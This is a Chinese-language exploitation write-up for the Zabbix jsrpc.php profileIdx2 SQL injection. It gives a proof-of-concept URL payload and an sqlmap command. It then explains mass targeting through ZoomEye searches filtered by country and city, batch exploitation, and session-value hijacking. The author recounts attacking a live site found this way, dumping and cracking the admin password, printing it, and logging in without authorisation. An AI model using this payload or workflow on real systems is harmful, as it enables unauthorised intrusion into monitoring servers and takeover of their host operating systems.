漏洞概述：
zabbix是一个开源的企业级性能监控解决方案。
官方网站：http://www.zabbix.com
zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。



漏洞测试：
在URL后面直接跟上如下内容：

jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&
mark_color=1


当出现图中所标识的关键字时，证明漏洞存在。这是在insert上的mysql的报错注入，我们可以自己构造语句进行利用，也可以在SQLMAP中输入详细的参数进行利用。

漏洞利用：

1.通过ZoomEye，搜索关键字zabbix，可以搜索到很多使用zabbix的目标，我们还可以加上关键字country限定搜索国家，city限定城市。




2.批量利用
这里使用独自等待的一个漏洞exp实现批量利用



也可以通过修改session直接登陆



然后把包放行，轻松登陆后台

3.使用SQLMAP跑也可以，我们输入：
Sqlmap -u “目标连接+PoC” -p “profileIdx2”  --technique E --dbs
也可以进行注入。



漏洞实例


我先利用Zoomeye的语法找到了一个站点，进入后，发现没有问题就是Zabbix~



哈哈，直接上EXP，看看抛出账号密码 ~



OK，爆出了账号密码，解密md5



成功爆出来密码为，1q2w3e4r5t，我只想说MDZZ，又是这种密码，没漏洞都能给他跑出来。
直接利用
账号：Zabbix
密码：1q2w3e4r5t
成功登陆后台，哈哈哈 ~~~



这是我们第一种利用方法，直接爆账号密码登陆。
现在我们试试抓包改登陆的session来充当管理员的身份进行登陆。
我们先来抓个包 ~




修改此处session值




修改后将包放行。




依然可以进入后台，其实第二种方法相对第一种还是更好一些，我们虽然能爆出管理员密码，但是并不是每个管理员都没有安全意识的，他们的md5我们可能解不出来，那我们又不能白白放弃这个利用的机会，这时，我们可以直接替换session值，就OK了，不需要破解md5的值，我们也可以登陆到后台，方便了不少。
